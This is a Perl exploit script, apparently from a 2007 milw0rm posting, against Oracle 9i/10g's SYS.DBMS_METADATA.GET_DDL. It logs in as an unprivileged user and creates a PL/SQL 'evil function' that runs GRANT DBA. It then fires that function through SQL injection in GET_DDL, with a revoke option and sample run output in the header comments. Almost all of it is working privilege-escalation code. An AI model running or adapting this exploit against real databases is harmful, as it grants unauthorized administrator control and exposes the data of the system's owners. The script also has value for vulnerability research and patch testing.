#!/usr/bin/perl
#
# Remote Oracle DBMS_METADAT.GET_DDL exploit (9i/10g)
#
# Grant or revoke dba permission to unprivileged user
# 
# Tested on "Oracle Database 10g Enterprise Edition Release 10.1.0.3.0"
# 
#   REF:    http://www.securityfocus.com/bid/16287 
#
#   AUTHOR: Andrea "bunker" Purificato
#           http://rawlab.mindcreations.com
#
#   DATE:   Copyright 2007 - Fri Feb 23 12:32:55 CET 2007
#
# Oracle InstantClient (basic + sdk) required for DBD::Oracle
#
#
# bunker@fin:~$ perl dbms_meta_get_ddl.pl -h localhost -s test -u bunker -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from BUNKER...
#  DBD::Oracle::db do failed: ORA-01031: insufficient privileges (DBD ERROR: OCIStmtExecute) [for Statement "REVOKE DBA FROM BUNKER"] at dbms_meta_get_ddl.pl line 95.
#  [-] Done!
#
# bunker@fin:~$ perl dbms_meta_get_ddl.pl -h localhost -s test -u bunker -p **** -g
#  [-] Wait...
#  [-] Creating evil function...
#  [-] Go ...(don't worry about errors)!
#  DBD::Oracle::st execute failed: ORA-31600: invalid input value '||BUNKER.own||' for parameter OBJECT_TYPE in function GET_DDL
#  ORA-06512: at "SYS.DBMS_METADATA", line 2576
#  ORA-06512: at "SYS.DBMS_METADATA", line 2627
#  ORA-06512: at "SYS.DBMS_METADATA", line 4220
#  ORA-06512: at line 5 (DBD ERROR: OCIStmtExecute) [for Statement "
#  DECLARE
#   R CLOB;
#  BEGIN
#   R := SYS.DBMS_METADATA.GET_DDL('''||BUNKER.own||''','');
#  END;
#  "] at dbms_meta_get_ddl.pl line 120.
#  [-] YOU GOT THE POWAH!!
#
# bunker@fin:~$ perl dbms_meta_get_ddl.pl -h localhost -s test -u bunker -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from BUNKER...
#  [-] Done!
#  

use warnings;
use strict;
use DBI;
use Getopt::Std;
use vars qw/ %opt /;

sub usage {
    print <<"USAGE";
    
Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> -g|-r [-P <port>]

Options:
     -h     <host>     target server address
     -s     <sid>      target sid name
     -u     <user>     user
     -p     <passwd>   password 

     -g|-r             (g)rant dba to user | (r)evoke dba from user
    [-P     <port>     Oracle port]

USAGE
    exit 0
}

my $opt_string = 'h:s:u:p:grP:';
getopts($opt_string, \%opt) or &usage;
&usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} );
&usage if ( !$opt{g} and !$opt{r} );
my $user = uc $opt{u};

my $dbh = undef;
if ($opt{P}) {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s};port=$opt{P}", $opt{u}, $opt{p}) or die;
} else {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s}", $opt{u}, $opt{p}) or die;
}

my $sqlcmd = "GRANT DBA TO $user";
print "[-] Wait...\n";

if ($opt{r}) {
    print "[-] Revoking DBA from $user...\n";
    $sqlcmd = "REVOKE DBA FROM $user";
    $dbh->do( $sqlcmd );
    print "[-] Done!\n";
    $dbh->disconnect;
    exit;
}

print "[-] Creating evil function...\n";
$dbh->do( qq{
CREATE OR REPLACE FUNCTION OWN RETURN NUMBER 
 AUTHID CURRENT_USER AS 
 PRAGMA AUTONOMOUS_TRANSACTION; 
BEGIN
 EXECUTE IMMEDIATE '$sqlcmd'; COMMIT; 
 RETURN(0);
END;
} );
 
print "[-] Go ...(don't worry about errors)!\n";
my $sth = $dbh->prepare(qq{
DECLARE
 R CLOB;
BEGIN
 R := SYS.DBMS_METADATA.GET_DDL('''||$user.own||''','');
END;
});
$sth->execute;
$sth->finish;
print "[-] YOU GOT THE POWAH!!\n";
$dbh->disconnect;
exit;

# milw0rm.com [2007-02-23]
